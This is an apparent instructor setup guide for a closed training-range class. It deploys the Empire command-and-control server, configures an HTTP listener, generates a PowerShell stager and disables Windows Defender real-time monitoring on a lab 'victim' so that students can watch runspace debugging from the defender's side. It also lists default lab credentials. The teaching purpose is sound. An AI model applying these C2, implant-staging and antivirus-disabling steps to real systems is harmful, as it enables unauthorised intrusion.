# Empire Demo Stack (Instructor Only)

Hidden pre-class setup for the **Empire walkthrough** (in-memory agent). Students do not see or run these steps.

These steps are how you use PCTE stack `b01-runspace-demo`. The Kali ops station and Windows victim are the hosts on that range.

Compose starts the Empire **server only**. It does not create a listener, stager, or agent. Prefer **Starkiller** for listener and launcher work. The CLI is optional.

The container name `w1-runspace-empire` is historical. Do not rename it on a running stack.

## Prerequisites

- Docker and Docker Compose on the instructor ops station.
- Network path from the Windows victim to the ops-station IP and `LISTENER_PORT` (default `8080`).
- Windows victim with PowerShell 5.1+ and an execution policy that allows the generated stager (validate in the closed environment).
- Local administrator on the Windows victim for the defender debugging session.
- Defender realtime **off** on the victim before the stager (`RealTimeProtectionEnabled` False). See **Windows victim: Defender** below.

**Range logins (defaults — confirm against the current range card):**

| Host | Account | Password | Use |
| --- | --- | --- | --- |
| Kali ops station | `kali` | `toortoor!` | Docker / Starkiller (`https://127.0.0.1:1337`) |
| Windows victim | `Administrator` | `Simspace1!Simspace1!` | Elevated defender session; run the stager |
| Empire / Starkiller | `empireadmin` | `password123` | C2 UI (see Quick Start if login fails) |

## Offline PCTE (image already on disk)

Hub tags use a leading `v` (for example `v6.7.1`, not `6.2.1`). `EMPIRE_IMAGE_TAG` in `instructor.env` must match `docker images`.

On a connected host, after a successful pull:

```bash
docker save bcsecurity/empire:v6.7.1 | gzip -c > empire-v6.7.1.tar.gz
```

Uncompressed `docker save` tars are several GB; gzip before copy. On the offline ops station:

```bash
docker load -i empire-v6.7.1.tar.gz
docker images bcsecurity/empire
```

If TAG is `<none>`, retag to match Compose (`docker tag <IMAGE_ID> bcsecurity/empire:v6.7.1`). Then `up -d`. Compose must **not** try to pull.

## Quick Start

From this directory:

```bash
cp instructor.env.example instructor.env
# Set EMPIRE_IMAGE_TAG to the loaded image tag.
# LISTENER_HOST is a reminder only — Compose does not inject it into Empire.
docker compose --env-file instructor.env up -d
docker compose ps
docker port w1-runspace-empire
```

Published ports (override host side in `instructor.env`):

| Host port | Maps to container | Purpose |
| --- | --- | --- |
| `EMPIRE_API_PORT` (default `1337`) | `1337` | Empire API / Starkiller |
| `LISTENER_PORT` (default `8080`) | same as host | HTTP listener callback |

Starkiller: open **`https://127.0.0.1:1337`** (or `http://127.0.0.1:1337` if HTTPS never loads). Use the **published** API port from `docker port`, not an unpublished port. Do **not** browse Starkiller by LAN IP when copying the stager — the UI will not copy the one-liner unless the browser is on loopback. For the **live Empire walkthrough**, you may open Starkiller on the **Windows victim** at `https://<ops-station-ip>:1337` so Shell and the debugger are on one projector (Shell tasking does not need clipboard).

**Login (Empire defaults):** username `empireadmin`, password `password123`. If login fails after an earlier run, wipe persisted users: `docker compose --env-file instructor.env down -v` then `up -d`.

## 1. Starkiller (primary)

1. On the ops station, open **`https://127.0.0.1:1337`** and log in as above. Accept the self-signed cert if prompted.
2. **Clipboard rule:** connect via `127.0.0.1` to copy the stager. Opening Starkiller at the ops-station LAN IP loads the UI but **clipboard copy of the stager one-liner fails**. After the agent is in, the live demo can use that LAN URL from the Windows victim.
3. Create HTTP listener `http-demo`:
   - **Host** = ops-station IP the **Windows victim** can reach (not `127.0.0.1`, not the value in `.env` unless you typed the same IP into Starkiller). Loopback is only for the instructor browser.
   - **Port** = `8080` (or your `LISTENER_PORT`).
   - Bind so the container accepts callbacks on the published port (`0.0.0.0` in the CLI equivalent).
4. **Stagers → multi/launcher → Language: powershell → Listener: http-demo → Generate.** Copy the one-liner.
5. Run the one-liner on the Windows victim. Confirm the **agent/beacon** checks in.

`LISTENER_HOST` / `LISTENER_NAME` in `instructor.env` are instructor reminders. Changing `.env` and restarting Compose does **not** retarget an existing listener. Kill/recreate `http-demo` with the correct Host, then generate a **new** launcher. Old stagers still have the old IP.

## 2. Empire CLI (optional)

The image runs the process as root. `docker exec` inherits that, so the wrapper refuses to start unless you force it:

```bash
docker exec -it w1-runspace-empire ./ps-empire -f client
```

If that tag wants the flag after the subcommand: `./ps-empire client -f`.

Host `sudo docker` is only for `/var/run/docker.sock`. Adding the Kali user to the `docker` group does not avoid `-f`.

Equivalent CLI listener (Host = victim-reachable ops-station IP):

```text
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: uselistener/http) > set Name http-demo
(Empire: uselistener/http) > set Host 172.16.3.2
(Empire: uselistener/http) > set Port 8080
(Empire: uselistener/http) > set BindIP 0.0.0.0
(Empire: uselistener/http) > execute
```

```text
(Empire: listeners) > usestager multi/launcher
(Empire: usestager/multi/launcher) > set Listener http-demo
(Empire: usestager/multi/launcher) > set Language powershell
(Empire: usestager/multi/launcher) > execute
```

## 3. Windows victim: Defender

Run from **elevated** PowerShell on the victim **before** the stager. The stager needs `RealTimeProtectionEnabled` False. Antivirus and the AM service can stay on.

```powershell
Get-MpComputerStatus | Select IsTamperProtected, AntivirusEnabled, RealTimeProtectionEnabled, AMServiceEnabled
```

If `RealTimeProtectionEnabled` is True:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Re-check the same `Get-MpComputerStatus` line. If you flipped realtime off, generate a **new** launcher.

Windows Firewall: default outbound usually allows the callback to `:8080`. Do not turn the whole firewall off unless check-in is blocked.

## 4. Run Stager on Windows Victim

**Do not commit a generated one-liner to git.** Copy it to instructor-only notes and run it once on the Windows victim before the live demo.

```powershell
# Paste the generated one-liner from Starkiller or the CLI here.
# Generate a fresh stager every class (Host is baked into the launcher).
```

Confirm a new agent in the Starkiller dashboard (or `agents` in the CLI).

## 5. Pre-Demo Validation

Before students enter, re-check Defender (realtime often re-enables). Same commands as section 3: `Get-MpComputerStatus` and, if `RealTimeProtectionEnabled` is True, `Set-MpPreference -DisableRealtimeMonitoring $true`.

From Starkiller (Agents → agent → **Shell**): type `whoami` and `hostname`. Honest output should return. Leave the agent running; a `powershell.exe` host should remain on the victim.

Defender-side spot check on the Windows victim (elevated PowerShell, separate from the agent session):

```powershell
Get-PSHostProcessInfo
Get-Process powershell | Select-Object Id, ProcessName, StartTime, Path
```

You should see multiple `powershell` processes: one for the Empire agent host and at least one for your defender/debug session.

From the victim, `Test-NetConnection <ops-station-ip> -Port 8080` should succeed.

## 6. Teardown

After the demo, kill the agent in Starkiller (Agents view). On the Windows victim, confirm the agent `powershell` process is gone.

From this directory:

```bash
docker compose --env-file instructor.env down
```

To remove persisted listeners, agents, and Starkiller users:

```bash
docker compose --env-file instructor.env down -v
```

## Troubleshooting (Instructor Pre-Class)

| Symptom | Check |
| --- | --- |
| `./ps-empire client` refuses to run as root | Expected. Use `./ps-empire -f client`. |
| Starkiller: no page | Confirm `docker port`; default UI is host **1337**. Open `https://127.0.0.1:1337` (not the LAN IP). |
| Stager copy to clipboard fails | Browser is on the LAN IP. Open Starkiller at `https://127.0.0.1:1337`. |
| Stager dies / no callback after generate | Defender realtime still on. Re-check `Get-MpComputerStatus`. If `RealTimeProtectionEnabled` is True, run `Set-MpPreference -DisableRealtimeMonitoring $true`, then generate a **new** launcher. |
| Compose tries to pull on an offline box | `EMPIRE_IMAGE_TAG` does not match a local image (missing `v` prefix is common). |
| `empireadmin` / `password123` rejected | Old users in `empire-data`. `down -v` then `up -d`. |
| Changed Kali IP; agents still miss | `.env` did not update Empire. Recreate listener Host; generate a new launcher. |
| No agent callback | Victim cannot reach ops-station IP:8080. `Test-NetConnection`. |
| `Enter-PSHostProcess` access denied during demo | Defender session must be elevated local admin. |
| Container exits immediately | Confirm `stdin_open: true` and `tty: true` in `docker-compose.yml`. |

## Related Demo Artifacts

- Walkthrough: [`../../RunspaceDebugging.md`](../../RunspaceDebugging.md)
- Discovery script: [`../RunspaceDebugging.ps1`](../RunspaceDebugging.ps1)
